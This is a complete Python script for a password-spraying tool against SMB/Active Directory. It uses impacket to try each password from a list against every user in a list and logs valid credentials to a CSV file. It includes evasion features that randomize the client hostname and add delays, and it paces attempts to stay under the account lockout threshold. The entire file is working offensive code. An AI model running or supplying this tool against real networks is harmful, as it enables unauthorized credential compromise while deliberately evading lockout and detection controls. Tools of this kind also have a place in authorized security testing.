#!/usr/bin/env python3

import argparse
import time
import sys
import json
import os
import random
import string
import re
from impacket.smbconnection import SMBConnection, SessionError

STATE_FILE = "spray_state.json"

def banner():
    print("""
                            , ____
                            ~(__  \\.
   .--------__               :o \\ |                 __--------.
  ( _________ \\              `.  |_|                / _________ )
   ( _________ `o-___________-`-.-'-_____________-o' _________ )
    ( _________  `-----------(.v(.)-------------'  _________ )
      \\____________________  `-   -'  ______________________/
         \\___________________'\\ * /`_____________________/
                        ______: . :
                       / _____ /   )
                      : /    /'  /'
                      : l   /  /
                      :)   (  :---._
                   ..//     `--------O\\..

             get yourself a cup of coffee this might take a while... :)
      """)

def get_random_hostname(length=8):
    """Generates a random Windows-like hostname."""
    letters = string.ascii_uppercase
    digits = string.digits
    # e.g., DESKTOP-7X91D2
    if random.choice([True, False]):
        prefix = "DESKTOP-"
        suffix = ''.join(random.choice(letters + digits) for _ in range(7))
        return prefix + suffix
    else:
        # e.g., WORK-12345
        return "WORK-" + ''.join(random.choice(digits) for _ in range(5))

def check_login_smb(domain, user, password, target, stealth=False):
    try:
        my_name = get_random_hostname() if stealth else None
        conn = SMBConnection(target, target, sess_port=445, myName=my_name)
        try:
            conn.login(user, password, domain)
            conn.logoff()
            return True
        except SessionError as e:
            if "STATUS_PASSWORD_MUST_CHANGE" in str(e):
                 return True 
            return False
        except Exception as e:
            return False
            
    except Exception as e:
        print(f"[-] Connection error to {target}: {str(e)}")
        return False

def check_complexity(password, level):
    """
    Level 0: None
    Level 1: Standard (3 of 4)
    Level 2: Standard (3 of 4) + User check (handled in loop)
    Level 3: Strict (4 of 4)
    """
    if level == 0:
        return True
    
    # Check groups
    has_upper = bool(re.search(r'[A-Z]', password))
    has_lower = bool(re.search(r'[a-z]', password))
    has_digit = bool(re.search(r'\d', password))
    has_special = bool(re.search(r'[!@#$%^&*(),.?":{}|<>]', password))
    
    score = sum([has_upper, has_lower, has_digit, has_special])
    
    if level == 3:
        return score == 4
    
    # Level 1 and 2 require 3 of 4
    return score >= 3

def save_state(index):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({"last_index": index}, f)
    except Exception as e:
        print(f"[!] Warning: Could not save state: {e}")

def load_state():
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, "r") as f:
                data = json.load(f)
                return data.get("last_index", 0)
    except Exception:
        pass
    return 0

def log_success(filepath, domain, user, password):
    if not filepath:
        return
    try:
        exists = os.path.exists(filepath)
        with open(filepath, "a") as f:
            if not exists:
                f.write("domain,user,password\n")
            f.write(f"{domain},{user},{password}\n")
    except Exception as e:
        print(f"[!] Error writing to output file: {e}")

def main():
    parser = argparse.ArgumentParser(description="SMB Password Spraying Tool")
    
    # Target & Creds
    parser.add_argument("--domain", "-d", required=False, help="Domain name (and Target Host)")
    parser.add_argument("--user", "-u", required=False, help="File containing user IDs")
    parser.add_argument("--password", "-p", required=False, help="File containing passwords to be tested")
    parser.add_argument("--pass-length", "-pl", type=int, required=False, help="Minimum password length")
    
    # Safety & Evasion
    parser.add_argument("--threshold", "-t", type=int, default=5, help="Account Lockout Threshold")
    parser.add_argument("--lockout", "-l", type=int, default=15, help="Lockout Timer in minutes")
    parser.add_argument("--jitter", "-j", type=int, default=0, help="Lockout Jitter: Random minutes added to wait timer")
    parser.add_argument("--stealth", action="store_true", help="Enable Stealth Mode (Random Hostnames + Per-Request Delays)")
    parser.add_argument("--complexity", "-c", type=int, default=0, help="Complexity: 0=None, 1=Standard, 2=GPO(User), 3=Strict")
    
    # Convenience
    parser.add_argument("--output", "-o", help="Output file for successful credentials (CSV)")
    parser.add_argument("--no-resume", action="store_true", help="Do not resume from saved state")
    parser.add_argument("--quiet", "-q", action="store_true", help="Quiet Mode: Only show found credentials (suppress trying...)")

    # Interactive Mode
    if len(sys.argv) == 1:
        print("[-] No arguments provided. Entering Interactive Mode...")
        print("    Press Enter to accept [Default Value]")
        
        args = argparse.Namespace()
        
        try:
            # Domain
            args.domain = input("\n[?] Target Domain/Host: ").strip()
            while not args.domain:
                print("    [!] Domain is required.")
                args.domain = input("[?] Target Domain/Host: ").strip()
                
            # Users File
            default_u = "users.txt"
            u_input = input(f"[?] Users File [{default_u}]: ").strip()
            args.user = u_input if u_input else default_u
            
            # Passwords File
            default_p = "passwords.txt"
            p_input = input(f"[?] Passwords File [{default_p}]: ").strip()
            args.password = p_input if p_input else default_p
            
            # Min Length
            default_pl = "7"
            pl_input = input(f"[?] Min Password Length [{default_pl}]: ").strip()
            args.pass_length = int(pl_input) if pl_input else 7
            
            # Policy Prompts
            print("\n    [!] Safety Note: The script creates a buffer of 3 attempts.")
            print("        Example: If Policy is 5, we spray 2 times then pause (5 - 3 = 2).")
            print("        If you want to spray more, increase the number based on the buffer.")
            
            default_t = "5"
            t_input = input(f"[?] Account Lockout Threshold (Real Policy Value) [{default_t}] (Enter 0 for None): ").strip()
            args.threshold = int(t_input) if t_input else 5

            default_l = "15"
            l_input = input(f"[?] Reset Account Lockout Counter (mins) [{default_l}]: ").strip()
            args.lockout = int(l_input) if l_input else 15
            
            # Additional defaults (Not prompted for improved UX)
            args.jitter = 0
            args.output = None
            args.no_resume = False
            
            # Stealth/Complexity/Quiet Prompts
            s_input = input("[?] Enable Stealth Mode (Random delays/hostnames)? [y/N]: ").lower()
            args.stealth = s_input == 'y'
            
            print("[?] Password Complexity Filter:")
            print("    0 = None (Spray everything)")
            print("    1 = Standard (3 of 4 chars)")
            print("    2 = GPO Compliant (Standard + No Username)")
            print("    3 = Strict (4 of 4 chars)")
            c_input = input(f"    Choice [0]: ").strip()
            args.complexity = int(c_input) if c_input in ["0", "1", "2", "3"] else 0

            q_input = input("[?] Enable Quiet Mode (Hide attempts)? [y/N]: ").lower()
            args.quiet = q_input == 'y'
            
        except KeyboardInterrupt:
            print("\n[!] Interrupted.")
            sys.exit(0)
            
    else:
        args = parser.parse_args()
        # Validate Required Args for CLI
        if not args.domain or not args.user or not args.password or not args.pass_length:
             parser.print_help()
             sys.exit(1)

    domain_name = args.domain
    pass_length = args.pass_length
    
    # Load Files
    try:
        with open(args.user, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
        with open(args.password, 'r') as f:
            pass_lines = f.readlines()
    except FileNotFoundError as e:
        print(f"[-] File not found: {e.filename}")
        sys.exit(1)

    banner()
    print("\n=== Starting Password Spray ===")
    print(f"[*] Target: {domain_name}")
    print(f"[*] Method: SMB (Native)")
    print(f"[*] Users: {len(users)} | Passwords: {len(pass_lines)}")
    
    threshold_str = str(args.threshold) if args.threshold > 0 else "None"
    print(f"[*] Policy: {args.lockout}m wait after {threshold_str} sprays")
    
    if args.stealth:
        print(f"[*] \033[95mSTEALTH MODE ENABLED\033[0m: Randomizing Hostnames & Adding Delays")
    if args.complexity > 0:
        levels = {1: "Standard (3/4)", 2: "GPO (3/4 + User)", 3: "Strict (4/4)"}
        print(f"[*] Complexity Filter: {levels.get(args.complexity, 'Unknown')}")
    if args.quiet:
        print(f"[*] QUIET MODE: Hiding spray attempts")

    # Resume Logic
    start_index = 0
    if not args.no_resume:
        start_index = load_state()
        if start_index > 0:
            print(f"[*] Resuming from password #{start_index + 1}...")

    sprays_since_pause = 0
    
    # Safety Check Logic
    if args.threshold > 0:
        # User requested: Threshold - 3 for maximum safety
        safe_limit = max(1, args.threshold - 3)
    else:
        # Threshold is None/0 -> Infinite sprays per user
        safe_limit = 999999999

    for pass_idx, pass_line in enumerate(pass_lines):
        if pass_idx < start_index:
            continue

        password = pass_line.strip()
        save_state(pass_idx) 

        # Filter: Length
        if len(password) < pass_length:
            if not args.quiet:
                print(f"\n[-] Skipping '{password}' (length < {pass_length})")
            continue
            
        # Filter: Global Complexity (Chars)
        if not check_complexity(password, args.complexity):
            if not args.quiet:
                print(f"\n[-] Skipping '{password}' (complexity requirements not met)")
            continue

        if not args.quiet:
            print(f"\n[+] Testing password {pass_idx + 1}/{len(pass_lines)}: '{password}' ...")
        
        found_count = 0
        for user in users:
            # Filter: Level 2 (User Name check)
            if args.complexity == 2 and user.lower() in password.lower():
                 # Don't log this in quiet mode since it's per-user and could be spammy
                 # But in non-quiet mode, maybe? 
                 # To keep it "Quiet", we just silence it.
                 # In verbose mode, it might be interesting but also spammy. 
                 # We'll just skip silently or maybe debug? 
                 # Let's skip silently to preserve the clean output structure.
                 continue

            # Stealth Delay
            if args.stealth:
                sleep_time = random.uniform(0.5, 1.5)
                time.sleep(sleep_time)

            is_valid = check_login_smb(domain_name, user, password, domain_name, stealth=args.stealth)
                
            if is_valid:
                print(f"[+] FOUND: \033[92m{domain_name}\\{user}:{password}\033[0m")
                log_success(args.output, domain_name, user, password)
                found_count += 1
        
        if found_count > 0:
            print(f"    -> Found {found_count} valid accounts.")

        sprays_since_pause += 1

        if sprays_since_pause >= safe_limit:
            print(f"\n[*] Safety limit reached ({sprays_since_pause} sprays). Pausing...")
            
            base_wait = args.lockout * 60
            jitter_wait = 0
            if args.jitter > 0:
                jitter_wait = random.randint(0, args.jitter * 60)
            
            total_wait = base_wait + jitter_wait
            if jitter_wait > 0:
                print(f"[*] Adding jitter: +{jitter_wait}s")

            start_time = time.time()
            end_time = start_time + total_wait
            
            try:
                while time.time() < end_time:
                    remaining = int(end_time - time.time())
                    minutes, seconds = divmod(remaining, 60)
                    print(f"Wait Timer: {minutes:02d}:{seconds:02d}", end='\r')
                    time.sleep(1)
            except KeyboardInterrupt:
                 print("\n[!] Timer interrupted by user.")
                 sys.exit(0)
            
            print("\n[*] Resuming...")
            sprays_since_pause = 0 

    if os.path.exists(STATE_FILE):
        os.remove(STATE_FILE)

    print("\n=== Script Finished ===")

if __name__ == "__main__":
    main()
